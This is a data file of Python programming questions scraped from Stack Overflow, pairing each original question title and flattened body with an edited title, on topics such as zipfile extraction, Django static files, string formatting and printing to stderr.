How to efficiently parse fixed width files in Python," I am trying to find an efficient way of parsing files that holds fixed width lines. For example, the first 20 characters represent a column, from 21:30 another one and so on.Assuming that the line holds 100 characters, what would be an efficient way to parse a line into several components?I could use string slicing per line, but it's a little bit ugly if the line is big. Are there any other fast methods? <code> ",How to efficiently parse fixed width files?
[Python] Extract files from zip without keeping the structure using ZipFile ?," I try to extract all files from .zip containing subfolders in one folder. I want all the files from subfolders extract in only one folder without keeping the original structure. At the moment, I extract all, move the files to a folder, then remove previous subfolders. The files with same names are overwrited.Is it possible to do it before writing files?Here is a structure for example: At the end I whish this: What can I add to this code ? if I rename files path from zip_file.namelist(), I have this error: <code>  my_zip/file1.txtmy_zip/dir1/file2.txtmy_zip/dir1/dir2/file3.txtmy_zip/dir3/file4.txt my_dir/file1.txtmy_dir/file2.txtmy_dir/file3.txtmy_dir/file4.txt import zipfilemy_dir = ""D:\\Download\\""my_zip = ""D:\\Download\\my_file.zip""zip_file = zipfile.ZipFile(my_zip, 'r')for files in zip_file.namelist(): zip_file.extract(files, my_dir)zip_file.close() KeyError: ""There is no item named 'file2.txt' in the archive""",Extract files from zip without keeping the structure using python ZipFile ?
Django: Friendlier header for StackedInline?," I'm using a Django admin StackedInline, as follows: It all works, but the header is pretty ugly: Anyone know how I can get rid of, or change, the Book_subject object part?thanks! <code>  class BookInline(admin.StackedInline): model = Book.subject.through verbose_name = 'Book' verbose_name_plural = 'Books with this subject'class SubjectAdmin(admin.ModelAdmin): inlines = [ BookInline, ] Books With This SubjectBook: Book_subject object",Django: Friendlier header for StackedInline for auto generated through model?
Joining: string and path with os.path," Why is this not working, what am I doing wrong? I expected this: Edit:A Solution <code>  >>> p1 = r'\foo\bar.txt'>>> os.path.join('foo1', 'foo2', os.path.normpath(p1))'\\foo\\bar.txt' 'foo1\\foo2\\foo\\bar.txt' >>> p1 = r'\foo\bar.txt'>>> p1 = p1.strip('\\') # Strip '\\' so the path would not be absolute >>> os.path.join('foo1', 'foo2', os.path.normpath(p1))'foo1\\foo2\\foo\\bar.txt'",Joining: string and absolute path with os.path
My quicksort sorts larger numbers faster? (Quick Python Test Code)," I was messing around with Python trying to practice my sorting algorithms and found out something interesting.I have three different pieces of data: x = number of numbers to sort y = range the numbers are in (all random generated ints) z = total time taken to sort When:x = 100000 andy = (0,100000) thenz = 0.94182094911 secWhen:x = 100000 andy = (0,100) thenz = 12.4218382537 secWhen:x = 100000 andy = (0,10) thenz = 110.267447809 secAny ideas?Code: -------------------revised NEW code----------------------------  <code>  import timeimport randomimport sys#-----Function definitionsdef quickSort(array): #random pivot location quicksort. uses extra memory. smaller = [] greater = [] if len(array) <= 1: return array pivotVal = array[random.randint(0, len(array)-1)] array.remove(pivotVal) for items in array: if items <= pivotVal: smaller.append(items) else: greater.append(items) return concat(quickSort(smaller), pivotVal, quickSort(greater))def concat(before, pivot, after): new = [] for items in before: new.append(items) new.append(pivot) for things in after: new.append(things) return new#-----Variable definitionslist = []iter = 0sys.setrecursionlimit(20000)start = time.clock() #start the clock#-----Generate the list of numbers to sortwhile(iter < 100000): list.append(random.randint(0,10)) #modify this to change sorting speed iter = iter + 1timetogenerate = time.clock() - start #current timer - last timer snapshot#-----Sort the list of numberslist = quickSort(list)timetosort = time.clock() - timetogenerate #current timer - last timer snapshot#-----Write the list of numbersfile = open(""C:\output.txt"", 'w')for items in list: file.write(str(items)) file.write(""\n"")file.close()timetowrite = time.clock() - timetosort #current timer - last timer snapshot#-----Print infoprint ""time to start: "" + str(start)print ""time to generate: "" + str(timetogenerate)print ""time to sort: "" + str(timetosort)print ""time to write: "" + str(timetowrite)totaltime = timetogenerate + timetosort + startprint ""total time: "" + str(totaltime) def quickSort(array): #random pivot location quicksort. uses extra memory. smaller = [] greater = [] equal = [] if len(array) <= 1: return array pivotVal = array[random.randint(0, len(array)-1)] array.remove(pivotVal) equal.append(pivotVal) for items in array: if items < pivotVal: smaller.append(items) elif items > pivotVal: greater.append(items) else: equal.append(items) return concat(quickSort(smaller), equal, quickSort(greater))def concat(before, equal, after): new = [] for items in before: new.append(items) for items in equal: new.append(items) for items in after: new.append(items) return new",Quicksort sorts larger numbers faster?
Why is Python's != acting strange when __eq__ returns True?," Take the following example: So now the two objects are equal and not-equal at the same time. I though the two operations are opposing?! <code>  >>> class C(object):... def __init__(self, p):... self.p = p... def __eq__(self, o):... return True... >>> C(1) is C(2)False>>> C(1) == C(2)True>>> C(1) != C(2)True # <- Why?!?",Why does Python's != operator think that arguments are equal and not equal at the same time?
Why is Jython much slower than Cpython Even though JVM has Advanced a lot," No flame wars please. I am admittedly no fan of Java, but I consider the JVM to be a fairly decent and well-optimized virtual machine. It's JIT-enabled and very close to the common denominator of the prevalent CPU architectures. I'd assume that the CPython runtime would be farther from the metal than a corresponding JVM-based runtime.If my assumptions are correct, could someone explain to me why Jython suffers such a major loss in performance compared to CPython? My initial assumption was that the JVM was simply designed for static languages, and it was difficult to port a dynamic one to it. However, Clojure seems to be an counterexample to that line of argument.On the other hand, IronPython seems to be doing fine. I believe the the lead developer on both projects were/are the same, so the argument that code design and implementation in one is significantly better than the other does not seem likely.I can't figure out what the precise reason is; any help will be appreciated. <code> ","Why is Jython much slower than CPython, despite the JVM's advances?"
"Python: Perforam an operation on each dictionary value, code less plz."," In python 2.6 I want to perform an operation on each dictionary value, for example, I want to multiply by 2 for each of them. How to code less for this task?  <code> ",Python: Perform an operation on each dictionary value
What is the difference between static files and media files in terms of Django 1.3?," I'm moving to Django 1.3 and find this separation of media and static files a bit confusing. Here is how default settings.py looks like: What should I put into MEDIA_ROOT and a STATIC_ROOT? Should those be separate directories? What is the difference? <code>  # Absolute filesystem path to the directory that will hold user-uploaded files.# Example: ""/home/media/media.lawrence.com/media/""MEDIA_ROOT = ''# URL that handles the media served from MEDIA_ROOT. Make sure to use a# trailing slash if there is a path component (optional in other cases).# Examples: ""http://media.lawrence.com/media/"", ""http://example.com/media/""MEDIA_URL = ''# Absolute path to the directory that holds static files.# Example: ""/home/media/media.lawrence.com/static/""STATIC_ROOT = ''# URL that handles the static files served from STATIC_ROOT.# Example: ""http://media.lawrence.com/static/""STATIC_URL = '/static/'",What is the difference between static files and media files in Django?
How do you set up a Flask application with SQLAlchemy testing?," It seems common practice in Flask to start like this: And then import and use app and db everywhere. But when you create db like this, it grabs configuration from the app, and it seems that this configuration can't ever be overridden once it happens. There are some pages on Flask's website about making application factories, but it's not clear how I would be able to still use app and db everywhere if I did that.How do I write a script to test my Flask application with a different database? How should I structure my application to make this possible? Do I have to use modules ? <code>  from flask import Flaskfrom flaskext.sqlalchemy import SQLAlchemyapp = Flask(__name__)SQLALCHEMY_DATABASE_URI = 'something'app.config.from_object(__name__)db = SQLAlchemy(app)",How do you set up a Flask application with SQLAlchemy for testing?
Why input() gives an error when I just press enter?," I have the following python code: But when I press Enter button, I get the following error: P.S. I am using python IDLE version 2.6 on Windows 7. <code>  print 'This is a simple game.'input('Press enter to continue . . .')print 'Choose an option:'... Traceback (most recent call last): File ""E:/4.Python/temp.py"", line 2, in <module> input('Press enter to continue . . .') File ""<string>"", line 0 ^SyntaxError: unexpected EOF while parsing",Why does input() give a SyntaxError when I just press enter?
Python check if current process is running?," I need to add a function to my python script that checks if the current script is already running. If it is then it will quit, if not it continues running the script. I've looked into methods of doing this but I cant figure out how to do it. <code> ",Check if current process is running using Python?
"pymongo upsert throws an error, is this a bug?"," I'm running an update on my MongoDB from Python. I have this line: But it throws this error: But True looks like an instance of bool to me!How should I correctly write this update? <code>  self.word_counts[source].update({'date':posttime},{""$inc"" : words},{'upsert':True}) raise TypeError(""upsert must be an instance of bool"")","PyMongo upsert throws ""upsert must be an instance of bool"" error"
"pymongo upsert throws ""upsert must be an instance of bool"" error, is this a bug?"," I'm running an update on my MongoDB from Python. I have this line: But it throws this error: But True looks like an instance of bool to me!How should I correctly write this update? <code>  self.word_counts[source].update({'date':posttime},{""$inc"" : words},{'upsert':True}) raise TypeError(""upsert must be an instance of bool"")","PyMongo upsert throws ""upsert must be an instance of bool"" error"
"pymongo upsert throws ""upsert must be an instance of bool"" error"," I'm running an update on my MongoDB from Python. I have this line: But it throws this error: But True looks like an instance of bool to me!How should I correctly write this update? <code>  self.word_counts[source].update({'date':posttime},{""$inc"" : words},{'upsert':True}) raise TypeError(""upsert must be an instance of bool"")","PyMongo upsert throws ""upsert must be an instance of bool"" error"
Python regexes: How to access multiple matches of a group?," I am putting together a fairly complex regular expression. One part of the expression matches strings such as '+a', '-57' etc. A + or a - followed by any number of letters or numbers. I want to match 0 or more strings matching this pattern.This is the expression I came up with: If I were to search the string '-56+a' using this pattern I would expect to get two matches:+a and -56However, I only get the last match returned: Looking at the python docs I see that:If a group matches multiple times, only the last match is accessible: So, my question is: how do you access multiple group matches? <code>  ([\+-][a-zA-Z0-9]+)* >>> m = re.match(""([\+-][a-zA-Z0-9]+)*"", '-56+a')>>> m.groups()('+a',) >>> m = re.match(r""(..)+"", ""a1b2c3"") # Matches 3 times.>>> m.group(1) # Returns only the last match.'c3'",regexes: How to access multiple matches of a group?
function that finds how many times n can be divided in half.," Basically, I need a function that will divide n by two and return the number of times it can be done.Coding so far: I know for a fact that I have to use the while loop, but I'm not confident in my third line of coding. What am I doing wrong?Examples: <code>  def div(n): while n >= 0: n / 2 return n >>> div(4)2>>> div(7)2",Function that finds how many times n can be divided in half
Python 2.7: Regex expression to remove line breaks," I am a complete newbie to Python, and I'm stuck with a regex problem. I'm trying to remove the line break character at the end of each line in a text file, but only if it follows a lowercase letter, i.e. [a-z]. If the end of the line ends in a lower case letter, I want to replace the line break/newline character with a space.This is what I've got so far: <code>  import reimport systextout = open(""output.txt"",""w"")textblock = open(sys.argv[1]).read()textout.write(re.sub(""[a-z]\z"",""[a-z] "", textblock, re.MULTILINE) )textout.close()",Regular expression to remove line breaks
Python string formatting: % vs. .format," Python 2.6 introduced the str.format() method with a slightly different syntax from the existing % operator. Which is better and for what situations?Python 3.6 has now introduced another string formatting format of string literals (aka ""f"" strings) via the syntax f""my string"". Is this formatting option better than the others?The following uses each method and has the same outcome, so what is the difference? Furthermore when does string formatting occur in Python? For example, if my logging level is set to HIGH will I still take a hit for performing the following % operation? And if so, is there a way to avoid this?  <code>  #!/usr/bin/python sub1 = ""python string!"" sub2 = ""an arg"" sub_a = ""i am a %s"" % sub1 sub_b = ""i am a {0}"".format(sub1) sub_c = f""i am a {sub1}"" arg_a = ""with %(kwarg)s!"" % {'kwarg':sub2} arg_b = ""with {kwarg}!"".format(kwarg=sub2) arg_c = f""with {sub2}!"" print(sub_a) # ""i am a python string!"" print(sub_b) # ""i am a python string!"" print(sub_c) # ""i am a python string!"" print(arg_a) # ""with an arg!"" print(arg_b) # ""with an arg!"" print(arg_c) # ""with an arg!"" log.debug(""some debug info: %s"" % some_info)",String formatting: % vs. .format vs. f-string literal
String formatting: % vs. .format," Python 2.6 introduced the str.format() method with a slightly different syntax from the existing % operator. Which is better and for what situations?Python 3.6 has now introduced another string formatting format of string literals (aka ""f"" strings) via the syntax f""my string"". Is this formatting option better than the others?The following uses each method and has the same outcome, so what is the difference? Furthermore when does string formatting occur in Python? For example, if my logging level is set to HIGH will I still take a hit for performing the following % operation? And if so, is there a way to avoid this?  <code>  #!/usr/bin/python sub1 = ""python string!"" sub2 = ""an arg"" sub_a = ""i am a %s"" % sub1 sub_b = ""i am a {0}"".format(sub1) sub_c = f""i am a {sub1}"" arg_a = ""with %(kwarg)s!"" % {'kwarg':sub2} arg_b = ""with {kwarg}!"".format(kwarg=sub2) arg_c = f""with {sub2}!"" print(sub_a) # ""i am a python string!"" print(sub_b) # ""i am a python string!"" print(sub_c) # ""i am a python string!"" print(arg_a) # ""with an arg!"" print(arg_b) # ""with an arg!"" print(arg_c) # ""with an arg!"" log.debug(""some debug info: %s"" % some_info)",String formatting: % vs. .format vs. f-string literal
String formatting: % vs. .format vs. string literal," Python 2.6 introduced the str.format() method with a slightly different syntax from the existing % operator. Which is better and for what situations?Python 3.6 has now introduced another string formatting format of string literals (aka ""f"" strings) via the syntax f""my string"". Is this formatting option better than the others?The following uses each method and has the same outcome, so what is the difference? Furthermore when does string formatting occur in Python? For example, if my logging level is set to HIGH will I still take a hit for performing the following % operation? And if so, is there a way to avoid this?  <code>  #!/usr/bin/python sub1 = ""python string!"" sub2 = ""an arg"" sub_a = ""i am a %s"" % sub1 sub_b = ""i am a {0}"".format(sub1) sub_c = f""i am a {sub1}"" arg_a = ""with %(kwarg)s!"" % {'kwarg':sub2} arg_b = ""with {kwarg}!"".format(kwarg=sub2) arg_c = f""with {sub2}!"" print(sub_a) # ""i am a python string!"" print(sub_b) # ""i am a python string!"" print(sub_c) # ""i am a python string!"" print(arg_a) # ""with an arg!"" print(arg_b) # ""with an arg!"" print(arg_c) # ""with an arg!"" log.debug(""some debug info: %s"" % some_info)",String formatting: % vs. .format vs. f-string literal
Python: True False," I tried running this piece of code: And it prints False. I thought Python treats anything with value as True. Why is this happening? <code>  path = '/bla/bla/bla'if path is True: print ""True""else: print ""False""",'True' and 'False' in Python
Importing Python classes from different files in a subdirectory," Here's the structure I'm working with: What I want to do is import in script.py the classes defined in myclass01.py and myclass02.py. If I do: It works fine for the class defined in myclass01.py. But with this solution if there are many classes defined in different files in subdir and I want to import all of them, I'd have to type one line for each file. There must be a shortcut for this. I tried: But it didn't work out.EDIT: here are the contents of the files:This is __init__.py (using __all__ as Apalala suggested): This is myclass01.py: This is myclass02.py: This is script.py: This is the traceback that I get when I try to run script.py: <code>  directory/ script.py subdir/ __init__.py myclass01.py myclass02.py from subdir.myclass01 import * from subdir.* import * __all__ = ['MyClass01','MyClass02'] class MyClass01: def printsomething(): print 'hey' class MyClass02: def printsomething(): print 'sup' from subdir import *MyClass01().printsomething()MyClass02().printsomething() File ""script.py"", line 1, in <module> from subdir import *AttributeError: 'module' object has no attribute 'MyClass01'",Importing classes from different files in a subdirectory
"List Manipulation with pop(), Python"," In short, I need to remove multiple items from a list according to their indexes. However, I can't use pop because it shifts the indexes (without some clumsy compensating system). Is there a way to remove multiple items simultaneously?I have an algorithm that goes through a list, and if the conditions are right removes that item via the pop method. A problem arises seeing as this is all done in a loop. Once pop is done the list is shortened by one, displacing all the values by one. So the loop will go out of range. Is it possible to remove multiple items simultaneously, or another solution? An example of my problem: <code>  L = ['a', 'b', 'c', 'd']for i in range(len(L)): print L if L[i] == 'a' or L[i] == 'c': L.pop(i)",List Manipulation in Python with pop()
Python: Import a script in Idle," This has probably been asked before, and is really basic, but:I'm using Windows 7. I have Idle for Python 2.4.4 and 3.1. I have some scripts residing in arbitrary locations on my file system. I'd like to import them and play around with their types. How can I do so?In Ubuntu, on the command line, import scriptname works if the directory I called python from contains scriptname. How would I import a script from somewhere else? <code> ",Import a script in IDLE
How can I make a class property in python," In python I can add a method to a class with the @classmethod decorator. Is there a similar decorator to add a property to a class? I can better show what I'm talking about. Is the syntax I've used above possible or would it require something more?The reason I want class properties is so I can lazy load class attributes, which seems reasonable enough. <code>  class Example(object): the_I = 10 def __init__( self ): self.an_i = 20 @property def i( self ): return self.an_i def inc_i( self ): self.an_i += 1 # is this even possible? @classproperty def I( cls ): return cls.the_I @classmethod def inc_I( cls ): cls.the_I += 1e = Example()assert e.i == 20e.inc_i()assert e.i == 21assert Example.I == 10Example.inc_I()assert Example.I == 11",How to make a class property?
Sort list of list with custom compare function in Python," I know there are several questions named like this, but they don't seem to work for me.I have a list of lists, 50 times 5 elements. I want to sort this list by applying a custom compare function to each element. This function calculates the fitness of the list by which the elements shall be sorted. I created two functions, compare and fitness: and Then I tried to call them by: or or or Also I tried list.sort() with the same parameters. But in any case the functions don't get a list as an argument but a None. I have no idea why that is, coming from mostly C++ this contradicts any idea of a callback function for me. How can I sort this lists with a custom function?EditI found my mistake. In the chain that creates the original list one function didn't return anything but the return value was used. Sorry for the bother <code>  def compare(item1, item2): return (fitness(item1) < fitness(item2)) def fitness(item): return item[0]+item[1]+item[2]+item[3]+item[4] sorted(mylist, cmp=compare) sorted(mylist, key=fitness) sorted(mylist, cmp=compare, key=fitness) sorted(mylist, cmp=lambda x,y: compare(x,y))",Sort a list of lists with a custom compare function
Check if a predicate evaluates true for all elements in an iterable in python," I am pretty sure there is a common idiom, but I couldn't find it with Google Search... Here is what I want to do (in Java): How is this done ""Pythonic"" in Python?Also would be great if I can get answer for this as well: <code>  // Applies the predicate to all elements of the iterable, and returns// true if all evaluated to true, otherwise falseboolean allTrue = Iterables.all(someIterable, somePredicate); // Returns true if any of the elements return true for the predicateboolean anyTrue = Iterables.any(someIterable, somePredicate);",Check if a predicate evaluates true for all elements in an iterable in Python
Add string in a certain position in Python," Is there any function in Python that I can use to insert a value in a certain position of a string?Something like this:""3655879ACB6"" then in position 4 add ""-"" to become ""3655-879ACB6"" <code> ",How to add a string in a certain position?
Function to clean up a URL," I am using URLs as a key so I need them to be consistent and clean. I need a python function that will take a URL and clean it up so that I can do a get from the DB. For example, it will take the following: and output a clean consistent version: I looked through std libs and GitHub and couldn't find anything like thisUpdateI couldn't find a Python library that implements everything discussed here and in the RFC:http://en.wikipedia.org/wiki/URL_normalizationSo I am writing one now. There is a lot more to this than I initially imagined. <code>  example.comexample.com/http://example.com/http://example.comhttp://example.com?http://example.com/?http://example.com// http://example.com/",Function in Python to clean up and normalize a URL
Function in Python to clean up and normaliza a URL," I am using URLs as a key so I need them to be consistent and clean. I need a python function that will take a URL and clean it up so that I can do a get from the DB. For example, it will take the following: and output a clean consistent version: I looked through std libs and GitHub and couldn't find anything like thisUpdateI couldn't find a Python library that implements everything discussed here and in the RFC:http://en.wikipedia.org/wiki/URL_normalizationSo I am writing one now. There is a lot more to this than I initially imagined. <code>  example.comexample.com/http://example.com/http://example.comhttp://example.com?http://example.com/?http://example.com// http://example.com/",Function in Python to clean up and normalize a URL
Python-Website to image?," I'm running Python 3.1 and you would call me an advanced novice :)My question is simple: I'm trying to make a simple program which asks the users for a URL (or multiple URLs) and then goes to the website and takes a screenshot (of the whole page, not just what can be seen in the browser without scrolling all the way down).It's simpler then it sounds, I want to use an existing platform on the web, similar to this: Although this website does not work :(, I'm wondering is it possible to do it with this website and if so, how? If it is not possible, are there any alternatives? <code>  import subprocessMYFILENAME = ""google_screen""MYURL = ""www.google.com""subprocess.Popen(['wget', '-O', MYFILENAME+'.png', 'http://images.websnapr.com/?url='+MYURL+'&size=s&nocache=82']).wait()",Website to image
python tuple comparison," I have been reading the Core Python programming book, and the author shows an example like: So, I'm wondering, how/why does it equal false? How does python compare these two tuples?Btw, it's not explained in the book. <code>  (4, 5) < (3, 5) # Equals false",How does tuple comparison work in Python?
Python: How do I copy a directory to a remote machine using Fabric?," I have a directory on my local machine that I would like to copy to a remote machine (and rename it) using Fabric. I know I can copy file using put(), but what about a directory. I know it's easy enough using scp, but I would prefer to do it from within my fabfile.py if possible. <code> ",How do I copy a directory to a remote machine using Fabric?
How to erase everything from the Text()?," Im working on a GUI for some chat programme. For user's input I have Text() widget, messages are sent via ""Return"" and after that I clean the Text(). But as hard as I tried I cant remove the last ""\n"" which Return button creates. Here is my code for this part: looking forward for offers) <code>  def Send(Event): MSG_to_send=Tex2.get(""1.0"",END) client.send(MSG_to_send) Tex2.delete(""1.0"",END)",How to erase everything from the tkinter text widget?
How to hide firefox window (Firefox WebDriver)?," When I execute multiple test simultaneously, i don't want to keep Firefox browser window visible.. I can minimize it using selenium.minimizeWindow() but I don't want to do it.Is there any way to hide Firefox window? I am using FireFox WebDriver. <code> ",How to hide Firefox window (Selenium WebDriver)?
How to hide Firefox window (Firefox WebDriver)?," When I execute multiple test simultaneously, i don't want to keep Firefox browser window visible.. I can minimize it using selenium.minimizeWindow() but I don't want to do it.Is there any way to hide Firefox window? I am using FireFox WebDriver. <code> ",How to hide Firefox window (Selenium WebDriver)?
Python: Executing a function by variable name," What I need to do is loop over a large number of different files and (try to) fetch metadata from the files.I can make a large if...elif... and test for every extension, but I think it would be much easier to store the extension in a variable, check if a function with that name exists, and execute it.This is my current solution, taken from another stackoverflow thread: There is a problem with this:If the underlying function raises an AttributeError, this is registered as a ""function not found"" error.I can add try...except blocks to all functions, but that would not be particularly pretty either ...What I'm looking for is more something like: Is there a straightforward way of doing this?Thanks :-) <code>  try: getattr(modulename, funcname)(arg)except AttributeError: print 'function not found ""%s"" (%s)' % (funcname, arg) if function_exists(fun): execute_function(fun, arg)",Executing a function by variable name in Python
Executing a function by variable name in Python," What I need to do is loop over a large number of different files and (try to) fetch metadata from the files.I can make a large if...elif... and test for every extension, but I think it would be much easier to store the extension in a variable, check if a function with that name exists, and execute it.This is my current solution, taken from another stackoverflow thread: There is a problem with this:If the underlying function raises an AttributeError, this is registered as a ""function not found"" error.I can add try...except blocks to all functions, but that would not be particularly pretty either ...What I'm looking for is more something like: Is there a straightforward way of doing this?Thanks :-) <code>  try: getattr(modulename, funcname)(arg)except AttributeError: print 'function not found ""%s"" (%s)' % (funcname, arg) if function_exists(fun): execute_function(fun, arg)",Executing a function by variable name in Python
Why is PyPi called the cheese shop?, I was running through the tutorials to build a Python distro package yesterday and the PyPI site kept on being calling the Cheese Shop. Why is that? <code> ,Why was PyPI called the cheese shop?
"How do i remove trailing whitespace in python code , using python script"," Something like: But nothing is being printed on stdout.Assuming some string named foo: <code>  import fileinputfor lines in fileinput.FileInput(""test.txt"", inplace=1): lines = lines.strip() if lines == '': continue print lines foo.lstrip() # to remove leading white spacefoo.rstrip() # to remove trailing whitespacefoo.strip() # to remove both lead and trailing whitespace","How to remove trailing whitespace in code, using another script?"
How can I access realitive paths in Python 2.7 when imported by different modules," The Goal:Access / Write to the same temp files when using a common utility function called from various python modules.Background:I am using the python Unittest module to run sets of custom tests that interface with instrumentation via pySerial. Because I am using the unittest module, I am unable to pass required variables, such as which serial port to use, into the unittest's test case. To get around this I am wanting to create a module that stores and returns pickled data. I have run into the issue that when I call the function get_foo() from test_case_1(), it tries to load the pickled data from the relative path based on test_case_1(), not the actual module that contains get_foo().It is worth noting that I have contemplated using global variables, but there is a handful of data that I want to retain from run to run. Meaning that all python modules will be closed and I want to re-load the data that was stored on the previous execution.I in SO question: Python - how to refer to relative paths of resources when working with code repository, I thought I found the solution in the first answer. To my dismay, this is not working for me in Python 2.7 (Debian)Is there an reliable way to return the path to a specific file when called from different modules? <code> ",How can I access relative paths in Python 2.7 when imported by different modules
Python: Test a String for a Substring?," Is there an easy way to test a Python string ""xxxxABCDyyyy"" to see if ""ABCD"" is contained within it? <code> ",Test a string for a substring
Test a String for a Substring?," Is there an easy way to test a Python string ""xxxxABCDyyyy"" to see if ""ABCD"" is contained within it? <code> ",Test a string for a substring
Inspecting python's math functions," I would like to look at the way Python does computes square roots, so I tried to find the definition for math.sqrt(), but I can't find it anywhere. I have looked in _math.c, mathmodule.c, and elsewhere.I know that python uses C's math functions, but are these somewhere in the Python distribution, or are they linked to code elsewhere? I am using Mac OS X.Where is the algorithm in math.sqrt()? <code> ",Where can I inspect Python's math functions?
Why doesn't memory does to get released to system after large queries (or series of queries) in django?," First off, DEBUG = False in settings.py, so no, connections['default'].queries is not growing and growing until it uses up all of memory.Lets start off with the fact that I've loaded the User table from django.contrib.auth.models.User with 10000 users (each named 'test#' where # is a number between 1 and 10000).Here is the view: I've attached the view above to the /leak/ url and start the development server (with DEBUG=False, and I've tested and it has nothing to do with running a development server vs other instances).After running: The runserver process' memory grows to around the size seen from ps aux output below and then stays at that level. Then running the above curl command above does not seem to grow the instance's memory usage (which I expected from a true memory leak?), it must be re-using the memory? However, I feel that there is something wrong here that the memory does not get released to the system (however, I understand that it may be better performance that python does NOT release the memory).Following this, I naively attempted to see if python would release large chunks of memory that it allocated. So I attempt the following from a python session: The memory is allocated on the a += ... line as expected, but when del a happens, the memory is released. Why is the behavior different for django query sets? Is it something that django is intending to do? Is there a way to change this behavior?I've literally spent 2 days debugging this behavior with no idea where to go next (I've learned to use guppy AND objgraph which seem to not point to anything interesting that I can figure out).UPDATE: This could be simply python memory management at work and have nothing to do with Django (suggested on django-users mailing list), but I'd like confirmation by somehow replicating this in python outside of Django.UPDATE: Using python version 2.6.5 <code>  from django.contrib.auth.models import Userfrom django.http import HttpResponseimport timedef leak(request): print ""loading users"" users = [] users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) users += list(User.objects.all()) print ""sleeping"" time.sleep(10) return HttpResponse('') % curl http://localhost:8000/leak/ USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDdlamotte 25694 11.5 34.8 861384 705668 pts/3 Sl+ 19:11 2:52 /home/dlamotte/tmp/django-mem-leak/env/bin/python ./manage.py runserver >>> a = ''>>> a += 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' * 10000000>>> del a",Why doesn't memory get released to system after large queries (or series of queries) in django?
python: During iteration print current value and next value," Possible Duplicate: Iterate a list as pair (current, next) in PythonWhile iterating a list, I want to print the current item in the list, plus the next value in the list. The output would be: <code>  listOfStuff = [a,b,c,d,e]for item in listOfStuff: print item, <nextItem> a bb cc dd e",Print current value and next value during iteration in Python
WTForms validators.optional question," I have a problem with WTForms validators.optional() because it stops the validation chain if the field is empty (WTForms docs). This means that the validation does not continue with custom functions, which can result in type errors.Code example: Is there any way or workaround to continue the validation chain even if the optional content is empty, maybe using custom validators?If I am approaching the problem in the wrong way, a hint at the right direction would be helpful! <code>  class MyForm(form): myfield = TextField('My Field', [validators.Optional()]) def validate_myfield(form, field): field.data = unicode(field.data)",WTForms validators.optional: continue validation of empty fields?
WTForms validators.optional and empty fields," I have a problem with WTForms validators.optional() because it stops the validation chain if the field is empty (WTForms docs). This means that the validation does not continue with custom functions, which can result in type errors.Code example: Is there any way or workaround to continue the validation chain even if the optional content is empty, maybe using custom validators?If I am approaching the problem in the wrong way, a hint at the right direction would be helpful! <code>  class MyForm(form): myfield = TextField('My Field', [validators.Optional()]) def validate_myfield(form, field): field.data = unicode(field.data)",WTForms validators.optional: continue validation of empty fields?
Pyramid framework question (pylons user), What is the equivalent of template context in Pyramid?Does the IBeforeRender event in pyramid have anything to with this? I've gone through the official documentation but diffcult to understand what the IBeforeRender event is exactly. <code> ,Equivalent of template context in Pyramid (pylons user)
Is there a unicode-ready substitute I can use for urllib.quote and urllib.unquote in Python 1.6.5?," Python's urllib.quote and urllib.unquote do not handle Unicode correctly in Python 2.6.5. This is what happens: Encoding the value to UTF8 also does not work: It's recognized as a bug and there is a fix, but not for my version of Python.What I'd like is something similar to urllib.quote/urllib.unquote, but handles unicode variables correctly, such that this code would work: Any recommendations? <code>  In [5]: print urllib.unquote(urllib.quote(u'Catao'))---------------------------------------------------------------------------KeyError Traceback (most recent call last)/home/kkinder/<ipython console> in <module>()/usr/lib/python2.6/urllib.pyc in quote(s, safe) 1222 safe_map[c] = (c in safe) and c or ('%%%02X' % i) 1223 _safemaps[cachekey] = safe_map-> 1224 res = map(safe_map.__getitem__, s) 1225 return ''.join(res) 1226 KeyError: u'\xc3' In [6]: print urllib.unquote(urllib.quote(u'Catao'.encode('utf8')))Catao decode_url(encode_url(u'Catao')) == u'Catao'",Is there a unicode-ready substitute I can use for urllib.quote and urllib.unquote in Python 2.6.5?
how to print to stderr in python ?," There are several ways to write to stderr: That seems to contradict zen of Python #13 , so what's the difference here and are there any advantages or disadvantages to one way or the other? Which way should be used? There should be one and preferably only one obvious way to do it. <code>  # Note: this first one does not work in Python 3print >> sys.stderr, ""spam""sys.stderr.write(""spam\n"")os.write(2, b""spam\n"")from __future__ import print_functionprint(""spam"", file=sys.stderr)",How to print to stderr in Python?
how to print to stderr in python?," There are several ways to write to stderr: That seems to contradict zen of Python #13 , so what's the difference here and are there any advantages or disadvantages to one way or the other? Which way should be used? There should be one and preferably only one obvious way to do it. <code>  # Note: this first one does not work in Python 3print >> sys.stderr, ""spam""sys.stderr.write(""spam\n"")os.write(2, b""spam\n"")from __future__ import print_functionprint(""spam"", file=sys.stderr)",How to print to stderr in Python?
How to print to stderr in python?," There are several ways to write to stderr: That seems to contradict zen of Python #13 , so what's the difference here and are there any advantages or disadvantages to one way or the other? Which way should be used? There should be one and preferably only one obvious way to do it. <code>  # Note: this first one does not work in Python 3print >> sys.stderr, ""spam""sys.stderr.write(""spam\n"")os.write(2, b""spam\n"")from __future__ import print_functionprint(""spam"", file=sys.stderr)",How to print to stderr in Python?
How to print to stderr in Python?," There are several ways to write to stderr: That seems to contradict zen of Python #13 , so what's the difference here and are there any advantages or disadvantages to one way or the other? Which way should be used? There should be one and preferably only one obvious way to do it. <code>  # Note: this first one does not work in Python 3print >> sys.stderr, ""spam""sys.stderr.write(""spam\n"")os.write(2, b""spam\n"")from __future__ import print_functionprint(""spam"", file=sys.stderr)",How to print to stderr in Python?
How to print to stderr in Python 2?," There are several ways to write to stderr: That seems to contradict zen of Python #13 , so what's the difference here and are there any advantages or disadvantages to one way or the other? Which way should be used? There should be one and preferably only one obvious way to do it. <code>  # Note: this first one does not work in Python 3print >> sys.stderr, ""spam""sys.stderr.write(""spam\n"")os.write(2, b""spam\n"")from __future__ import print_functionprint(""spam"", file=sys.stderr)",How to print to stderr in Python?
to call python code(.py file) using c#?," I have some python code that does a certain task. I need to call this code from C# without converting the python file as an .exe, since the whole application is built on C#.How can I do this? <code> ",Calling python code(.py files) from C#
